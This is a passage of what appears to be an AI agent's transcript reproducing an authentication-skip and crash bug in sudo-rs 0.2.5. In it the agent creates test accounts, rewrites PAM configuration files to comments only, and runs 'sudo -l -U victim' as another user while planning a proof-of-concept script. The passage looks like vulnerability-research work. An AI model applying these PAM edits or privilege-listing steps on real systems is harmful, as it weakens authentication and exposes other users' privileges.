</tool_call>

Target is **sudo-rs 0.2.5** — this matches a known issue where `sudo -l -U <other-user>` skips authentication, letting any user list another user's sudo rules (upstream sudo denies this). Let me build the scenario manually to verify before writing the PoC.

<tool_call>
{
  "name": "Bash",
  "arguments": {
    "command": "useradd -m invoker 2>&1; useradd -m victim 2>&1; id invoker; id victim",
    "description": "Create invoker and victim test accounts"
  }
}
</tool_call>

The empty PAM config fixes the crash — the SIGFPE was from a PAM module in the default config. But wait — with neutralized PAM, the listing now *succeeds* (rc=0). Let me investigate the crash more precisely: which PAM line causes it, and whether a crash can still be triggered with PAM neutralized.

<tool_call>
{
  "name": "Bash",
  "arguments": {
    "command": "cp /etc/pam.d/other /tmp/other.orig 2>/dev/null; cat /tmp/other.orig",
    "description": "Save and view original pam.d/other"
  }
}
</tool_call>

This is very revealing — the target is a **static-pie** binary with **libpam statically linked in** (all the `_pam_*` strings), and Rust paths like `src/pam/mod.rs`, "Panic during pam authentication", "PAM didn't return username". The FPE is likely a division-by-zero in statically-linked libpam's `pam_fail_delay` or similar. Let me create task tracking and dig into where exactly.

<tool_call>
{
  "name": "TaskCreate",
  "arguments": {
    "subject": "Investigate FPE crash trigger conditions in target sudo binary",
    "description": "Determine the exact PAM/environment conditions under which the statically-linked sudo-rs 0.2.5 binary crashes with SIGFPE (rc 136), and confirm the mandated scenario (comment-only /etc/pam.d/sudo, neutralized other/pam.conf) triggers it.",
    "activeForm": "Investigating FPE crash conditions"
  }
}
</tool_call>

<tool_call>
{
  "name": "TaskCreate",
  "arguments": {
    "subject": "Write /workspace/out/poc.py implementing the scenario and JSON contract",
    "description": "Single-file Python 3 PoC: create users, write /etc/sudoers-rs (0440), write comment-only PAM files, install setuid copy, run `<tool> -l -U victim` as invoker, capture output, emit JSON contract with observable/returncode/signal fields. Idempotent, deterministic, bounded.",
    "activeForm": "Writing poc.py"
  }
}
</tool_call>

Crash is fully deterministic. Now the key question — does the *task-mandated* PAM configuration (comment-only files) trigger it?

<tool_call>
{
  "name": "Bash",
  "arguments": {
    "command": "echo \"### comment-only /etc/pam.d/sudo (modules via other absent), no other, no pam.conf\"\nprintf '# comment only\\n' > /etc/pam.d/sudo\nrm -f /etc/pam.d/other /etc/pam.conf\nrunuser -u invoker -- /tmp/poc-test/bin/sudo -l -U victim; echo \"rc=$?\"\n\necho \"### comment-only sudo + comment-only other + comment-only pam.conf\"\nprintf '# comment only\\n' > /etc/pam.d/other\nprintf '# comment only\\n' > /etc/pam.conf\nrunuser -u invoker -- /tmp/poc-test/bin/sudo -l -U victim; echo \"rc=$?\"",
    "description": "Test mandated comment-only PAM configuration again carefully"
  }
}
</tool_call>

